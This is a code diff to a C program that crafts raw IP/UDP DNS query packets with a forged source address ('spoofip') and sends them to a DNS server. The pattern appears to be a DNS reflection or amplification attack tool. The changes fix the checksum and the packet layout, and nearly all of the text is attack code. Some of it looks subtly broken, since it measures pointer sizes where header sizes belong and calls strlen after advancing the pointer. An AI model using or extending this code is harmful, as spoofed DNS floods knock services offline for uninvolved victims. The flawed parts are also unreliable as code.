@@ -16,7 +16,7 @@ void CreateDnsHeader(dh *dns){
 }
 
 void CreateQueryInfo(query *q){
-	q->dnsq_class = htons(0xff);
+	q->dnsq_class = htons(0x00ff);
 	q->dnsq_type = htons(1);
 }
 
@@ -37,6 +37,7 @@ unsigned short CheckIpUdpSum(int length, unsigned short *ptr){
 	}
 	if(length == 1){
 		*((unsigned char *)&odd) = *(unsigned char *)ptr;
+		sum += odd;
 	}
 
 	sum = (sum >> 16) + (sum & 0xffff);
@@ -49,19 +50,23 @@ unsigned short CheckIpUdpSum(int length, unsigned short *ptr){
 void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	int sd;
 	unsigned char dns_data[128];
-	char buf[4096], *data, *psdata, *dns_server;
+	char buf[4096], *data, *psdata;
+	unsigned char* dns_server;
 	struct sockaddr_in sin, din;
 	memset(buf, 0, 4096);
 
-	ih *ipheader = (ih *)buf;
-	uh *udpheader = (uh *)(buf + sizeof(ih));
 	dh *dnsheader = (dh *)&dns_data;
-
 	CreateDnsHeader(dnsheader);
 
-	strcpy(dns_server,"\3www\6google\3com");
+	dns_server = (unsigned char *)&dns_data[sizeof(dh)];
+	*dns_server++ = '\4';
+	*dns_server++ = 'a';
+	*dns_server++ = 'r';
+	*dns_server++ = 'p';
+	*dns_server++ = 'a';
+	*dns_server++ = '\0';
 	int length = strlen(dns_server) + 1;
-	query *Query = (query *)(sizeof(dnsheader) + length);	
+	query *Query = (query *)&dns_data[(sizeof(dnsheader) + length)];
 	CreateQueryInfo(Query);
 
 	data = buf + sizeof(ih) + sizeof(uh);
@@ -74,6 +79,7 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	inet_pton(AF_INET, dnsip, &sin.sin_addr.s_addr);
 	inet_pton(AF_INET, spoofip, &din.sin_addr.s_addr);
 
+	ih *ipheader = (ih *)buf;
 	ipheader->ihl = 5;
 	ipheader->version = 4;
 	ipheader->tos = 0;
@@ -86,6 +92,7 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 	ipheader->check = 0;
 	ipheader->check = CheckIpUdpSum(sizeof(ih) + sizeof(uh) + sizeof(dh) + sizeof(Query) + length, (unsigned short *)buf);
 
+	uh *udpheader = (uh *)(buf + sizeof(ih));
 	udpheader->source = htons(port);
 	udpheader->dest = htons(53);
 	udpheader->len = htons(8 + sizeof(dh) + sizeof(Query) + length);
@@ -104,6 +111,7 @@ void SendDnsPacket(char* dnsip, char* spoofip, int port){
 
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sd < 0){
+		printf("sd = %d\n", sd);
 		PrintError("socket error");
 	}
 	else{
